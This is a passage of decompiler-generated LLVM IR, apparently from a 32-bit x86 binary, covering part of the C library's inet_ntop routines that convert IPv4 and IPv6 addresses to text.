  store i32 %v11_805392b, i32* %eax.global-to-local, align 4
  %tmp36 = urem i16 %tmp35, 10
  %v12_805392b = zext i16 %tmp36 to i32
  %v1_805392e = or i32 %v12_805392b, 48
  %v8_805392e = trunc i32 %v1_805392e to i8
  store i32 %v1_805392e, i32* %edx.global-to-local, align 4
  %v0_8053931 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053931 = add i32 %v0_8053931, 2
  store i32 %v1_8053931, i32* @edi, align 4
  %v2_8053934 = load i32, i32* @esp, align 4
  %v3_8053934 = load i32, i32* @esi, align 4
  %v4_8053934 = add i32 %v2_8053934, 43
  %v5_8053934 = add i32 %v4_8053934, %v3_8053934
  %v6_8053934 = inttoptr i32 %v5_8053934 to i8*
  store i8 %v8_805392e, i8* %v6_8053934, align 1
  br label %dec_label_pc_8053938

dec_label_pc_8053938:                             ; preds = %dec_label_pc_80538f6, %dec_label_pc_8053916, %dec_label_pc_805391a
  store i32 %v2_80538d6, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_8053941 = load i32, i32* @edi, align 4
  %v1_8053941 = add i32 %v0_8053941, 2
  store i32 %v1_8053941, i32* %ebx.global-to-local, align 4
  %v0_8053944 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053944 = add i32 %v0_8053944, 1
  store i32 %v1_8053944, i32* %ebp.global-to-local, align 4
  %v2_8053945 = load i8, i8* %v1_80538e1, align 1
  %v3_8053945 = zext i8 %v2_8053945 to i32
  %v4_8053945 = load i32, i32* %eax.global-to-local, align 4
  %v5_8053945 = and i32 %v4_8053945, -65536
  %v6_8053945 = or i32 %v5_8053945, %v3_8053945
  store i32 %v6_8053945, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_805394b = load i32, i32* @esp, align 4
  %v2_805394b = add i32 %v0_8053941, 44
  %v3_805394b = add i32 %v2_805394b, %v0_805394b
  %v4_805394b = inttoptr i32 %v3_805394b to i8*
  store i8 46, i8* %v4_805394b, align 1
  %v0_8053950 = load i32, i32* @ecx, align 4
  %v1_8053950 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053950 = urem i32 %v1_8053950, 65536
  %v3_8053950 = load i32, i32* %edx.global-to-local, align 4
  %v4_8053950 = mul i32 %v3_8053950, 65536
  %v5_8053950 = or i32 %v4_8053950, %v2_8053950
  %v6_8053950 = urem i32 %v0_8053950, 65536
  %v7_8053950 = udiv i32 %v5_8053950, %v6_8053950
  %v8_8053950 = urem i32 %v7_8053950, 65536
  %v10_8053950 = and i32 %v1_8053950, -65536
  %v11_8053950 = or i32 %v8_8053950, %v10_8053950
  store i32 %v11_8053950, i32* %eax.global-to-local, align 4
  %v12_8053950 = urem i32 %v5_8053950, %v6_8053950
  %v14_8053950 = and i32 %v3_8053950, -65536
  %v15_8053950 = or i32 %v12_8053950, %v14_8053950
  %v1_8053953 = add i32 %v15_8053950, 48
  %v8_8053953 = trunc i32 %v1_8053953 to i8
  store i32 %v1_8053953, i32* @edx, align 4
  %v2_8053956 = load i32, i32* @esp, align 4
  %v3_8053956 = load i32, i32* @edi, align 4
  %v4_8053956 = add i32 %v2_8053956, 43
  %v5_8053956 = add i32 %v4_8053956, %v3_8053956
  %v6_8053956 = inttoptr i32 %v5_8053956 to i8*
  store i8 %v8_8053953, i8* %v6_8053956, align 1
  %v0_805395a = load i32, i32* %ebp.global-to-local, align 4
  %v7_805395d = icmp sgt i32 %v0_805395a, 3
  br i1 %v7_805395d, label %dec_label_pc_8053963, label %dec_label_pc_80538d0

dec_label_pc_8053963:                             ; preds = %dec_label_pc_8053938, %entry
  %v0_8053963 = load i32, i32* @esp, align 4
  %v1_8053963 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053963 = add i32 %v0_8053963, 42
  %v3_8053963 = add i32 %v2_8053963, %v1_8053963
  %v4_8053963 = inttoptr i32 %v3_8053963 to i8*
  store i8 0, i8* %v4_8053963, align 1
  %v2_805396b = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_805396b, i32* %ebx.global-to-local, align 4
  %tmp23 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp23, i8** %stack_var_-92, align 4
  %v3_8053970 = call i32 @strlen(i8* %tmp23)
  store i32 %v3_8053970, i32* @eax, align 4
  %tmp31 = icmp ugt i32 %v3_8053970, %v0_80538bf
  br i1 %tmp31, label %dec_label_pc_805397e, label %dec_label_pc_805398d

dec_label_pc_805397e:                             ; preds = %dec_label_pc_8053963
  %v0_805397e = load i8*, i8** %stack_var_-92, align 4
  %v1_805397e = ptrtoint i8* %v0_805397e to i32
  %v2_805397e = call i32 @__errno_location(i32 %v1_805397e)
  %v1_8053983 = inttoptr i32 %v2_805397e to i32*
  store i32 28, i32* %v1_8053983, align 4
  br label %dec_label_pc_805399c

dec_label_pc_805398d:                             ; preds = %dec_label_pc_8053963
  %tmp24 = bitcast i8** %stack_var_-60 to i32*
  %v3_80539905 = load i32, i32* %tmp24, align 4
  %tmp25 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_80539905, i32* %tmp25, align 4
  %v0_8053994.cast = inttoptr i32 %v3_80539905 to i8*
  %v4_8053994 = call i32 @strcpy(i8* %v0_8053994.cast, i32 %v2_805396b)
  br label %dec_label_pc_805399c

dec_label_pc_805399c:                             ; preds = %dec_label_pc_805397e, %dec_label_pc_805398d
  %storemerge = phi i32 [ %v4_8053994, %dec_label_pc_805398d ], [ 0, %dec_label_pc_805397e ]
  %v0_80539a3 = phi i32 [ %v4_8053994, %dec_label_pc_805398d ], [ 0, %dec_label_pc_805397e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805389e, i32* @esi, align 4
  store i32 %v0_805389d, i32* @edi, align 4
  ret i32 %v0_80539a3

; uselistorder directives
  uselistorder i32 %v0_805395a, { 1, 0 }
  uselistorder i32 %v3_8053950, { 1, 0 }
  uselistorder i32 %v1_8053950, { 1, 0 }
  uselistorder i32 %v1_805392e, { 1, 0 }
  uselistorder i32 %v1_805390a, { 1, 0 }
  uselistorder i32 %v0_805391c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80538eb, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 48, { 2, 3, 12, 14, 4, 5, 6, 9, 8, 7, 10, 0, 11, 1, 13 }
  uselistorder i32 43, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i8 100, { 2, 0, 1 }
  uselistorder i32 100, { 6, 0, 4, 5, 1, 2, 3 }
  uselistorder i32 -65536, { 3, 4, 5, 1, 0, 6, 7, 10, 12, 2, 8, 9, 11 }
  uselistorder i1* @df, { 4, 28, 29, 0, 1, 30, 31, 32, 11, 2, 3, 40, 41, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder label %dec_label_pc_805399c, { 1, 0 }
  uselistorder label %dec_label_pc_8053938, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80538d0, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_80539a5 = load i32, i32* @edi, align 4
  %v0_80539a6 = load i32, i32* @esi, align 4
  %v0_80539a7 = load i32, i32* @ebx, align 4
  %v15_80539a8 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_80539af = icmp eq i32 %arg1, 2
  br i1 %v9_80539af, label %dec_label_pc_80539bf, label %dec_label_pc_80539b4

dec_label_pc_80539b4:                             ; preds = %entry
  %v9_80539b4 = icmp eq i32 %arg1, 10
  %v1_80539b7 = icmp eq i1 %v9_80539b4, false
  br i1 %v1_80539b7, label %dec_label_pc_8053b5b, label %dec_label_pc_80539d7

dec_label_pc_80539bf:                             ; preds = %entry
  %v4_80539bf = ptrtoint i8* %arg3 to i32
  store i32 %v4_80539bf, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_80539cb = call i32 @inet_ntop4(i32 %v0_80539a7, i32 %v0_80539a6, i32 %v0_80539a5)
  store i32 %v3_80539cb, i32* %eax.global-to-local, align 4
  store i32 %v3_80539cb, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053b68

dec_label_pc_80539d7:                             ; preds = %dec_label_pc_80539b4
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_80539dc = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_80539dc, i32* %eax.global-to-local, align 4
  %tmp43 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp43, i8** %stack_var_-124, align 4
  %v6_80539e1 = call i32 @__GI_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v6_80539e1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8053a03 = add i32 %arg2, 1
  br label %dec_label_pc_80539ed

dec_label_pc_80539ed:                             ; preds = %dec_label_pc_80539ed.dec_label_pc_80539ed_crit_edge, %dec_label_pc_80539d7
  %v1_8053a10 = phi i32 [ %v15_80539a8, %dec_label_pc_80539d7 ], [ %v1_8053a10.pre, %dec_label_pc_80539ed.dec_label_pc_80539ed_crit_edge ]
  %v0_8053a0b72 = phi i32 [ 0, %dec_label_pc_80539d7 ], [ %v0_8053a14.pre, %dec_label_pc_80539ed.dec_label_pc_80539ed_crit_edge ]
  %v1_80539f6 = ashr i32 %v0_8053a0b72, 31
  %v2_80539f7 = zext i32 %v0_8053a0b72 to i64
  %v4_80539f7 = zext i32 %v1_80539f6 to i64
  %v5_80539f7 = mul nuw i64 %v4_80539f7, 4294967296
  %v6_80539f7 = or i64 %v5_80539f7, %v2_80539f7
  %v8_80539f7 = sdiv i64 %v6_80539f7, 2
  %v9_80539f7 = trunc i64 %v8_80539f7 to i32
  store i32 %v9_80539f7, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_80539f7, i32* %ebx.global-to-local, align 4
  %v2_80539ff = add i32 %v0_8053a0b72, %arg2
  %v3_80539ff = inttoptr i32 %v2_80539ff to i8*
  %v4_80539ff = load i8, i8* %v3_80539ff, align 1
  %v5_80539ff = zext i8 %v4_80539ff to i32
  store i32 %v5_80539ff, i32* %eax.global-to-local, align 4
  %v3_8053a03 = add i32 %v2_8053a03, %v0_8053a0b72
  %v4_8053a03 = inttoptr i32 %v3_8053a03 to i8*
  %v5_8053a03 = load i8, i8* %v4_8053a03, align 1
  %v6_8053a03 = zext i8 %v5_8053a03 to i32
  store i32 %v6_8053a03, i32* %edx.global-to-local, align 4
  %v2_8053a08 = mul nuw nsw i32 %v5_80539ff, 256
  %v1_8053a0b = add i32 %v0_8053a0b72, 2
  store i32 %v1_8053a0b, i32* %ecx.global-to-local, align 4
  %v2_8053a0e = or i32 %v6_8053a03, %v2_8053a08
  store i32 %v2_8053a0e, i32* %eax.global-to-local, align 4
  %v3_8053a10 = mul i32 %v9_80539f7, 4
  %v4_8053a10 = add i32 %v3_8053a10, 60
  %v5_8053a10 = add i32 %v4_8053a10, %v1_8053a10
  %v6_8053a10 = inttoptr i32 %v5_8053a10 to i32*
  store i32 %v2_8053a0e, i32* %v6_8053a10, align 4
  %v0_8053a14.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8053a17 = icmp sgt i32 %v0_8053a14.pre, 15
  br i1 %v7_8053a17, label %dec_label_pc_8053a19, label %dec_label_pc_80539ed.dec_label_pc_80539ed_crit_edge

dec_label_pc_80539ed.dec_label_pc_80539ed_crit_edge: ; preds = %dec_label_pc_80539ed
  %v1_8053a10.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80539ed

dec_label_pc_8053a19:                             ; preds = %dec_label_pc_80539ed
  %v4_80539d7 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8053a23.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053a23

dec_label_pc_8053a23:                             ; preds = %dec_label_pc_8053a19, %dec_label_pc_8053a50
  %v0_8053a5071 = phi i32 [ 0, %dec_label_pc_8053a19 ], [ %v1_8053a50, %dec_label_pc_8053a50 ]
  %v0_8053a3b70 = phi i32 [ -1, %dec_label_pc_8053a19 ], [ %v0_8053a3b8, %dec_label_pc_8053a50 ]
  %v0_8053a5b69 = phi i32 [ -1, %dec_label_pc_8053a19 ], [ %v0_8053a409, %dec_label_pc_8053a50 ]
  %v0_8053a6668 = phi i32 [ -1, %dec_label_pc_8053a19 ], [ %v0_8053a4b13, %dec_label_pc_8053a50 ]
  %v2_8053a23 = mul nuw nsw i32 %v0_8053a5071, 4
  %v3_8053a23 = add nuw nsw i32 %v2_8053a23, 60
  %v4_8053a23 = add i32 %v3_8053a23, %v0_8053a23.pre
  %v5_8053a23 = inttoptr i32 %v4_8053a23 to i32*
  %v6_8053a23 = load i32, i32* %v5_8053a23, align 4
  %v7_8053a23 = icmp eq i32 %v6_8053a23, 0
  %v1_8053a28 = icmp eq i1 %v7_8053a23, false
  %v10_8053a3b = icmp eq i32 %v0_8053a3b70, -1
  br i1 %v1_8053a28, label %dec_label_pc_8053a3b, label %dec_label_pc_8053a2a

dec_label_pc_8053a2a:                             ; preds = %dec_label_pc_8053a23
  %v1_8053a2d = icmp eq i1 %v10_8053a3b, false
  br i1 %v1_8053a2d, label %dec_label_pc_8053a38, label %dec_label_pc_8053a2f

dec_label_pc_8053a2f:                             ; preds = %dec_label_pc_8053a2a
  store i32 %v0_8053a5071, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053a50

dec_label_pc_8053a38:                             ; preds = %dec_label_pc_8053a2a
  %v0_8053a38 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053a38 = add i32 %v0_8053a38, 1
  store i32 %v1_8053a38, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053a50

dec_label_pc_8053a3b:                             ; preds = %dec_label_pc_8053a23
  br i1 %v10_8053a3b, label %dec_label_pc_8053a50, label %dec_label_pc_8053a40

dec_label_pc_8053a40:                             ; preds = %dec_label_pc_8053a3b
  %v10_8053a40 = icmp eq i32 %v0_8053a5b69, -1
  %v0_8053a49.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053a45 = load i32, i32* @ebp, align 4
  %v7_8053a47 = icmp sgt i32 %v0_8053a49.pre, %v1_8053a45
  %or.cond = or i1 %v10_8053a40, %v7_8053a47
  br i1 %or.cond, label %dec_label_pc_8053a49, label %dec_label_pc_8053a4d

dec_label_pc_8053a49:                             ; preds = %dec_label_pc_8053a40
  store i32 %v0_8053a49.pre, i32* @ebp, align 4
  store i32 %v0_8053a6668, i32* @edi, align 4
  br label %dec_label_pc_8053a4d

dec_label_pc_8053a4d:                             ; preds = %dec_label_pc_8053a40, %dec_label_pc_8053a49
  %v0_8053a4011 = phi i32 [ %v0_8053a6668, %dec_label_pc_8053a49 ], [ %v0_8053a5b69, %dec_label_pc_8053a40 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053a50

dec_label_pc_8053a50:                             ; preds = %dec_label_pc_8053a3b, %dec_label_pc_8053a38, %dec_label_pc_8053a2f, %dec_label_pc_8053a4d
  %v0_8053a4b13 = phi i32 [ %v0_8053a6668, %dec_label_pc_8053a3b ], [ %v0_8053a6668, %dec_label_pc_8053a38 ], [ %v0_8053a5071, %dec_label_pc_8053a2f ], [ -1, %dec_label_pc_8053a4d ]
  %v0_8053a3b8 = phi i32 [ -1, %dec_label_pc_8053a3b ], [ %v0_8053a3b70, %dec_label_pc_8053a38 ], [ %v0_8053a5071, %dec_label_pc_8053a2f ], [ -1, %dec_label_pc_8053a4d ]
  %v0_8053a409 = phi i32 [ %v0_8053a5b69, %dec_label_pc_8053a3b ], [ %v0_8053a5b69, %dec_label_pc_8053a38 ], [ %v0_8053a5b69, %dec_label_pc_8053a2f ], [ %v0_8053a4011, %dec_label_pc_8053a4d ]
  %v1_8053a50 = add nuw nsw i32 %v0_8053a5071, 1
  store i32 %v1_8053a50, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8053a50, 8
  br i1 %exitcond, label %dec_label_pc_8053a56, label %dec_label_pc_8053a23

dec_label_pc_8053a56:                             ; preds = %dec_label_pc_8053a50
  %v10_8053a56 = icmp eq i32 %v0_8053a4b13, -1
  br i1 %v10_8053a56, label %dec_label_pc_8053a68, label %dec_label_pc_8053a5b

dec_label_pc_8053a5b:                             ; preds = %dec_label_pc_8053a56
  %v10_8053a5b = icmp eq i32 %v0_8053a409, -1
  %v0_8053a64.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8053a5b, label %dec_label_pc_8053a64, label %dec_label_pc_8053a60

dec_label_pc_8053a60:                             ; preds = %dec_label_pc_8053a5b
  %v1_8053a60 = load i32, i32* @ebp, align 4
  %v7_8053a62 = icmp sgt i32 %v0_8053a64.pre, %v1_8053a60
  br i1 %v7_8053a62, label %dec_label_pc_8053a64, label %dec_label_pc_8053a68.thread

dec_label_pc_8053a68.thread:                      ; preds = %dec_label_pc_8053a60
  br label %dec_label_pc_8053a6d

dec_label_pc_8053a64:                             ; preds = %dec_label_pc_8053a5b, %dec_label_pc_8053a60
  store i32 %v0_8053a64.pre, i32* @ebp, align 4
  store i32 %v0_8053a4b13, i32* @edi, align 4
  br label %dec_label_pc_8053a68

dec_label_pc_8053a68:                             ; preds = %dec_label_pc_8053a56, %dec_label_pc_8053a64
  %v0_8053a68 = phi i32 [ %v0_8053a409, %dec_label_pc_8053a56 ], [ %v0_8053a4b13, %dec_label_pc_8053a64 ]
  %v10_8053a68 = icmp eq i32 %v0_8053a68, -1
  br i1 %v10_8053a68, label %dec_label_pc_8053a75, label %dec_label_pc_8053a68.dec_label_pc_8053a6d_crit_edge

dec_label_pc_8053a68.dec_label_pc_8053a6d_crit_edge: ; preds = %dec_label_pc_8053a68
  %v0_8053a6d.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8053a6d

dec_label_pc_8053a6d:                             ; preds = %dec_label_pc_8053a68.dec_label_pc_8053a6d_crit_edge, %dec_label_pc_8053a68.thread
  %v0_8053a6d = phi i32 [ %v1_8053a60, %dec_label_pc_8053a68.thread ], [ %v0_8053a6d.pre, %dec_label_pc_8053a68.dec_label_pc_8053a6d_crit_edge ]
  %v0_8053a6849 = phi i32 [ %v0_8053a409, %dec_label_pc_8053a68.thread ], [ %v0_8053a68, %dec_label_pc_8053a68.dec_label_pc_8053a6d_crit_edge ]
  %v1_8053a6d = add i32 %v0_8053a6d, -1
  %v6_8053a6d = sub i32 0, %v0_8053a6d
  %v7_8053a6d = and i32 %v0_8053a6d, %v6_8053a6d
  %v8_8053a6d = icmp slt i32 %v7_8053a6d, 0
  %v9_8053a6d = icmp eq i32 %v1_8053a6d, 0
  %v10_8053a6d = icmp slt i32 %v1_8053a6d, 0
  %v3_8053a70 = icmp eq i1 %v10_8053a6d, %v8_8053a6d
  %v4_8053a70 = icmp eq i1 %v9_8053a6d, false
  %v5_8053a70 = and i1 %v4_8053a70, %v3_8053a70
  br i1 %v5_8053a70, label %dec_label_pc_8053a75, label %dec_label_pc_8053a72

dec_label_pc_8053a72:                             ; preds = %dec_label_pc_8053a6d
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8053a75

dec_label_pc_8053a75:                             ; preds = %dec_label_pc_8053a6d, %dec_label_pc_8053a68, %dec_label_pc_8053a72
  %v0_8053b1518 = phi i32 [ %v0_8053a6849, %dec_label_pc_8053a6d ], [ -1, %dec_label_pc_8053a68 ], [ -1, %dec_label_pc_8053a72 ]
  %v2_8053a75 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8053a75, i32* @ebx, align 4
  %v3_8053af7 = add i32 %v4_80539d7, 64
  %v12_8053ab5 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_8053b1561 = icmp eq i32 %v0_8053b1518, -1
  %v1_8053abd = icmp eq i1 %v12_8053ab5, false
  br label %dec_label_pc_8053a80

dec_label_pc_8053a80:                             ; preds = %dec_label_pc_8053a75, %dec_label_pc_8053b0b
  %v10_8053b1567 = phi i1 [ %v10_8053b1561, %dec_label_pc_8053a75 ], [ %v10_8053b15, %dec_label_pc_8053b0b ]
  %v0_8053a9a66 = phi i32 [ 0, %dec_label_pc_8053a75 ], [ %v1_8053b0b, %dec_label_pc_8053b0b ]
  %v1_8053a9065 = phi i32 [ %v0_8053b1518, %dec_label_pc_8053a75 ], [ %v0_8053b15.pre, %dec_label_pc_8053b0b ]
  %v0_8053a9e64 = phi i32 [ %v2_8053a75, %dec_label_pc_8053a75 ], [ %v0_8053a9419, %dec_label_pc_8053b0b ]
  %stack_var_-120.163 = phi i8* [ null, %dec_label_pc_8053a75 ], [ %stack_var_-120.0, %dec_label_pc_8053b0b ]
  %stack_var_-116.162 = phi i32 [ 32, %dec_label_pc_8053a75 ], [ %stack_var_-116.0, %dec_label_pc_8053b0b ]
  br i1 %v10_8053b1567, label %dec_label_pc_8053a9a, label %dec_label_pc_8053a85

dec_label_pc_8053a85:                             ; preds = %dec_label_pc_8053a80
  %v12_8053a85 = icmp eq i32 %v0_8053a9a66, %v1_8053a9065
  %v5_8053a87 = icmp slt i32 %v0_8053a9a66, %v1_8053a9065
  br i1 %v5_8053a87, label %dec_label_pc_8053a9a, label %dec_label_pc_8053a89

dec_label_pc_8053a89:                             ; preds = %dec_label_pc_8053a85
  %v1_8053a89 = load i32, i32* @ebp, align 4
  %v2_8053a89 = add i32 %v1_8053a89, %v1_8053a9065
  store i32 %v2_8053a89, i32* %eax.global-to-local, align 4
  %v5_8053a8e = icmp slt i32 %v0_8053a9a66, %v2_8053a89
  br i1 %v5_8053a8e, label %dec_label_pc_8053a90, label %dec_label_pc_8053a9a

dec_label_pc_8053a90:                             ; preds = %dec_label_pc_8053a89
  %v1_8053a92 = icmp eq i1 %v12_8053a85, false
  br i1 %v1_8053a92, label %dec_label_pc_8053b0b, label %dec_label_pc_8053a94

dec_label_pc_8053a94:                             ; preds = %dec_label_pc_8053a90
  %v1_8053a94 = inttoptr i32 %v0_8053a9e64 to i8*
  store i8 58, i8* %v1_8053a94, align 1
  %v0_8053a97 = load i32, i32* @ebx, align 4
  %v1_8053a97 = add i32 %v0_8053a97, 1
  store i32 %v1_8053a97, i32* @ebx, align 4
  br label %dec_label_pc_8053b0b

dec_label_pc_8053a9a:                             ; preds = %dec_label_pc_8053a89, %dec_label_pc_8053a85, %dec_label_pc_8053a80
  %v1_8053a9a = icmp eq i32 %v0_8053a9a66, 0
  br i1 %v1_8053a9a, label %dec_label_pc_8053aa2.thread, label %dec_label_pc_8053aa2

dec_label_pc_8053aa2.thread:                      ; preds = %dec_label_pc_8053a9a
  br label %dec_label_pc_8053af6

dec_label_pc_8053aa2:                             ; preds = %dec_label_pc_8053a9a
  %v1_8053a9e = inttoptr i32 %v0_8053a9e64 to i8*
  store i8 58, i8* %v1_8053a9e, align 1
  %v0_8053aa1 = load i32, i32* @ebx, align 4
  %v1_8053aa1 = add i32 %v0_8053aa1, 1
  store i32 %v1_8053aa1, i32* @ebx, align 4
  %v0_8053aa2.pre = load i32, i32* @esi, align 4
  %v9_8053aa2 = icmp eq i32 %v0_8053aa2.pre, 6
  %v1_8053aa5 = icmp eq i1 %v9_8053aa2, false
  br i1 %v1_8053aa5, label %dec_label_pc_8053af6, label %dec_label_pc_8053aa7

dec_label_pc_8053aa7:                             ; preds = %dec_label_pc_8053aa2
  %v0_8053aa7 = load i32, i32* @edi, align 4
  %v1_8053aa7 = icmp eq i32 %v0_8053aa7, 0
  %v1_8053aa9 = icmp eq i1 %v1_8053aa7, false
  br i1 %v1_8053aa9, label %dec_label_pc_8053af6, label %dec_label_pc_8053aab

dec_label_pc_8053aab:                             ; preds = %dec_label_pc_8053aa7
  %v0_8053aab = load i32, i32* @ebp, align 4
  %v9_8053aab = icmp eq i32 %v0_8053aab, 6
  br i1 %v9_8053aab, label %dec_label_pc_8053abf, label %dec_label_pc_8053ab0

dec_label_pc_8053ab0:                             ; preds = %dec_label_pc_8053aab
  %v9_8053ab0 = icmp eq i32 %v0_8053aab, 5
  %v1_8053ab3 = icmp eq i1 %v9_8053ab0, false
  br i1 %v1_8053ab3, label %dec_label_pc_8053af6, label %dec_label_pc_8053ab5

dec_label_pc_8053ab5:                             ; preds = %dec_label_pc_8053ab0
  br i1 %v1_8053abd, label %dec_label_pc_8053af6, label %dec_label_pc_8053abf

dec_label_pc_8053abf:                             ; preds = %dec_label_pc_8053ab5, %dec_label_pc_8053aab
  %v2_8053ac5 = sub i32 %v1_8053aa1, %v2_8053a75
  store i32 %v2_8053ac5, i32* @esi, align 4
  %v2_8053ad0 = sub i32 46, %v2_8053ac5
  store i32 %v2_8053ad0, i32* @ecx, align 4
  %v1_8053ad2 = add i32 %arg2, 12
  store i32 %v1_8053ad2, i32* @eax, align 4
  store i32 %v1_8053aa1, i32* @edx, align 4
  %v0_8053ad7 = load i8*, i8** %stack_var_-124, align 4
  %v1_8053ad7 = ptrtoint i8* %v0_8053ad7 to i32
  %v3_8053ad7 = ptrtoint i8* %stack_var_-120.163 to i32
  %v5_8053ad7 = call i32 @inet_ntop4(i32 %v1_8053ad7, i32 %v3_8053ad7, i32 %stack_var_-116.162)
  store i32 %v5_8053ad7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8053ade = icmp eq i32 %v5_8053ad7, 0
  br i1 %v1_8053ade, label %dec_label_pc_8053b68, label %dec_label_pc_8053ae6

dec_label_pc_8053ae6:                             ; preds = %dec_label_pc_8053abf
  %v0_8053ae9 = load i32, i32* @ebx, align 4
  %v5_8053ae9 = inttoptr i32 %v0_8053ae9 to i8*
  store i8* %v5_8053ae9, i8** %stack_var_-124, align 4
  %v3_8053aea = call i32 @strlen(i8* %v5_8053ae9)
  store i32 %v3_8053aea, i32* %eax.global-to-local, align 4
  %v0_8053af2 = load i32, i32* @ebx, align 4
  %v3_8053af2 = add i32 %v0_8053af2, %v3_8053aea
  store i32 %v3_8053af2, i32* @ebx, align 4
  %v0_8053b1a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053b1a

dec_label_pc_8053af6:                             ; preds = %dec_label_pc_8053aa2.thread, %dec_label_pc_8053ab5, %dec_label_pc_8053ab0, %dec_label_pc_8053aa7, %dec_label_pc_8053aa2
  %v1_8053af754 = phi i32 [ 0, %dec_label_pc_8053aa2.thread ], [ %v0_8053aa2.pre, %dec_label_pc_8053ab5 ], [ %v0_8053aa2.pre, %dec_label_pc_8053ab0 ], [ %v0_8053aa2.pre, %dec_label_pc_8053aa7 ], [ %v0_8053aa2.pre, %dec_label_pc_8053aa2 ]
  %v0_8053b0053 = phi i32 [ %v0_8053a9e64, %dec_label_pc_8053aa2.thread ], [ %v1_8053aa1, %dec_label_pc_8053ab5 ], [ %v1_8053aa1, %dec_label_pc_8053ab0 ], [ %v1_8053aa1, %dec_label_pc_8053aa7 ], [ %v1_8053aa1, %dec_label_pc_8053aa2 ]
  %v0_8053af6 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8053af6, i32* %stack_var_-112, align 4
  %v2_8053af7 = mul i32 %v1_8053af754, 4
  %v4_8053af7 = add i32 %v3_8053af7, %v2_8053af7
  %v5_8053af7 = inttoptr i32 %v4_8053af7 to i32*
  %v6_8053af7 = load i32, i32* %v5_8053af7, align 4
  %v5_8053b00 = inttoptr i32 %v0_8053b0053 to i8*
  store i8* %v5_8053b00, i8** %stack_var_-124, align 4
  %v6_8053b01 = call i32 @sprintf(i32 %v0_8053b0053, i32 ptrtoint ([3 x i8]* @global_var_80574d1.284 to i32), i32 %v6_8053af7, i32 %v0_8053af6)
  store i32 %v6_8053b01, i32* %eax.global-to-local, align 4
  %v0_8053b09 = load i32, i32* @ebx, align 4
  %v2_8053b09 = add i32 %v0_8053b09, %v6_8053b01
  store i32 %v2_8053b09, i32* @ebx, align 4
  br label %dec_label_pc_8053b0b

dec_label_pc_8053b0b:                             ; preds = %dec_label_pc_8053a90, %dec_label_pc_8053a94, %dec_label_pc_8053af6
  %stack_var_-116.0 = phi i32 [ %v6_8053af7, %dec_label_pc_8053af6 ], [ %stack_var_-116.162, %dec_label_pc_8053a90 ], [ %stack_var_-116.162, %dec_label_pc_8053a94 ]
